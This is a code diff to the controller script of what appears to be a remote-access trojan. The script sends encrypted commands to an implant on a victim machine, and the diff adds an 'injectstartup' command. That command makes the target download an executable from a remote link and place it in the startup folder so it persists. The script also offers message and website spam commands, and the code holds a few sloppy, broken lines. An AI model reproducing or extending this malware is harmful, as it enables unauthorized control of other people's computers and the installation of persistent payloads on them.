@@ -18,6 +18,7 @@ from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from win32com.shell import shell, shellcon
 import base64
 
 
@@ -27,8 +28,17 @@ import base64
 
 #the passkey that you set for the payload and handler for encryption
 # WARNING MUST BE EXACTLY 8 BYTES LONG
-PASSKEY = "aaaaaaaa"
+PASSKEY = "ihaveyou"
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
 
 
@@ -141,6 +151,9 @@ def main():
                         print("upload <file> <output file>")
                         print("spammessage <message> <title> <amount>")
                         print("spamwebsite <website> <amout>")
+                        print("injectstartup <method> [parameters]")
+                        print("Injectstartup has one method now.")
+                        print("method 'startdirectory'. Arguments: <link to file> <filename with extension> (ex. 'injectstartup webfile http://dropbox.com/file/blabla&autodownload=1 startup.exe'")
                 elif thing2[0] == "ls":
                     print("ls")
                     msg = encrypt(PASSKEY, str(" ".join(thing2)))
@@ -214,6 +227,27 @@ def main():
                 elif thing2[0] == "spamwebsite":
                     if len(thing2) > 1:
                         s.send(encrypt(PASSKEY, " ".join(thing2)))
+                elif thing2[0] == "injectstartup":
+                    statusdone = False
+                    uploading = True
+                    if len(thing2) == 1:
+                        thing2.insert(1, filemethod)
+                        s.send(encrypt(PASSKEY, " ".join(thing2)))
+                    else:
+                        s.send(encrypt(PASSKEY, " ".join(thing2)))
+                    while statusdone == False:
+                        settime
+                        time.sleep(0.1)
+                        status = s.recv(BUFFER_SIZE)
+                        if status == "error":
+                            print("There was an error!")
+                            error = s.recv(BUFFER_SIZE)
+                            print(bcolors.WARNING + error + bcolors.ENDC)
+                        elif status == "doneerror":
+                            print(bcolors.WARNING + "stopped with error" + bcolors.ENDC)
+                        elif status == "done":
+                            print(bcolors.OKGREEN + "Succesfully injected to startup" + bcolors.ENDC)
+                    uploading = False
         except Exception as e:
             print("whoops something went wrong.. reconnecting..")
             print("this was the error:")
